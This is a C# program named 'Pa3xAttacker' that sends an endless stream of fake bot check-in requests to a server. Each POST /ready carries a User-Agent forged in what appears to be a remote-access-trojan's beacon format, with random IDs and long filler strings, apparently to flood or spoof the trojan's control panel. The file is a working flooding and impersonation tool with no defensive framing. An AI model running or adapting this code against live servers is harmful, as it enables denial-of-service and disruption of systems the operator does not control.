using System;
using System.Net;
using System.Threading;

/*
 *		Author: Etor Madiv
 *		Contact us: etormadiv [ATAtat] gmail [DOTDotdot] com
 *		<facebook id="100012269284978">
 *			<firstName>Etor</firstName>
 *			<lastName>Madiv</lastName>
 *		</facebook>
 */

namespace Pa3xAttacker
{
	public class Program
	{
		public static void Main()
		{
			Attacker attacker = new Attacker("127.0.0.1", 6000);
			attacker.Start();
		}
	}
	
	public class Attacker
	{
		private string aHost;
		private int aPort;
		private Random random = new Random();
		
		public Attacker(string host, int port)
		{
			aHost = host;
			aPort = port;
		}
		
		public void Start()
		{
			new Thread( () => 
			{
				while(true)
				{
//Request example
/* POST /ready HTTP/1.1
 * Accept: * /*
 * Accept-Language: fr
 * User-Agent: ID<'>HOSTNAME<'>USERNAME<'>Microsoft Windows 2000<'><'>4.1.2f<'>Not Found<'>NO - 08/06/2016<'>
 * UA-CPU: AMD64
 * Accept-Encoding: gzip, deflate
 * Host: 127.0.0.1:6000
 * Content-Length: 0
 * Connection: Keep-Alive
 * Cache-Control: no-cache
 */
					WebRequest request = WebRequest.Create("http://"+ aHost +":"+ aPort +"/ready");
					request.Credentials = CredentialCache.DefaultCredentials;
					((HttpWebRequest)request).UserAgent = random.Next(99999999).ToString("X8") + "<'>WIN-HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH<'>HAHAHAHAHAHhhhhhhhhhhhhhhhhHHHHHHHHHHHHHHHHHHHHHHhhhhhhhhhhhhhhhhh<'>Microsoft Windows 2000<'><'>4.1.2f<'>Not Found<'>NO - 08/06/2016<'>";
					request.Headers.Add("UA-CPU", "AMD64");
					request.Method = "POST";
					request.ContentLength = 0;
					WebResponse response = null;
					try{
						response = request.GetResponse();
						Console.WriteLine( DateTime.Now.ToString("[HH:mm:ss] : ") + ((HttpWebResponse)response).StatusDescription);
						response.Close();
					}catch{
						Console.WriteLine( DateTime.Now.ToString("[HH:mm:ss] : ") + "Nothing done.");
					}
					
				}
			}){ IsBackground = false }.Start();
		}
	}
}